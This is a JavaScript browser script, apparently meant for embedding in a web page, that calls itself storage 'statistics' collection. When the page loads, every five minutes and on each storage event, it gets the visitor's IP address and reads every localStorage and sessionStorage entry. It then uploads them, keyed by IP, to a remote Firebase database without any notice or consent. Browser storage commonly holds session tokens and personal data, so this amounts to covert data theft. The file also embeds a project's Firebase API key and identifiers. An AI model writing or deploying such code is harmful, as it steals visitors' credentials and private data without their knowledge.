if (typeof firebase === "undefined") {
    console.error("Firebase SDK не загружен.");
} else {
    console.log("Firebase SDK загружен.");
}

const firebaseConfig = {
    apiKey: "AIzaSyDRml8DMEyJCHmN-W6Uh8iCLEuJ7Qi6n_U",
    authDomain: "corridors-e6bb2.firebaseapp.com",
    databaseURL: "https://corridors-e6bb2-default-rtdb.firebaseio.com",
    projectId: "corridors-e6bb2",
    storageBucket: "corridors-e6bb2.appspot.com",
    messagingSenderId: "296262914238",
    appId: "1:296262914238:web:2569ed6fad9e62f486ceef",
    measurementId: "G-T8YVN3FDHJ"
};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();

console.log("Firebase успешно инициализирован.");

function sanitizeKey(key) {
    return key.replace(/[.#$/\[\]]/g, "-");
}

async function collectStorageStatistics() {
    try {
        console.log("Сбор данных...");

        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const userIP = ipData.ip;
        console.log("IP пользователя:", userIP);

        const validUserIP = sanitizeKey(userIP);

        const userRef = database.ref(`statistics/${validUserIP}`);

        const snapshot = await userRef.get();
        const existingData = snapshot.exists() ? snapshot.val() : { localStorage: {}, sessionStorage: {} };
        console.log("Текущие данные:", existingData);

        const localStorageData = {};
        const timestamp = new Date().toISOString();

        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const sanitizedKey = sanitizeKey(key); 

            localStorageData[sanitizedKey] = {
                value: localStorage.getItem(key),
                firstSeen: existingData.localStorage?.[sanitizedKey]?.firstSeen || timestamp,
                lastUpdated: timestamp
            };
        }
        console.log("localStorage:", localStorageData);

        const sessionStorageData = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const sanitizedKey = sanitizeKey(key);

            sessionStorageData[sanitizedKey] = {
                value: sessionStorage.getItem(key),
                recorded: timestamp
            };
        }
        console.log("sessionStorage:", sessionStorageData);

        await userRef.set({
            lastUpdated: timestamp,
            localStorage: { ...existingData.localStorage, ...localStorageData },
            sessionStorage: sessionStorageData
        });

        console.log("Данные отправлены.");
    } catch (error) {
        console.error("Ошибка при сборе статистики:", error);
    }
}

function initStatisticsCollection() {
    collectStorageStatistics();
    setInterval(collectStorageStatistics, 5 * 60 * 1000);
    window.addEventListener('storage', () => collectStorageStatistics());
}

document.addEventListener('DOMContentLoaded', initStatisticsCollection);
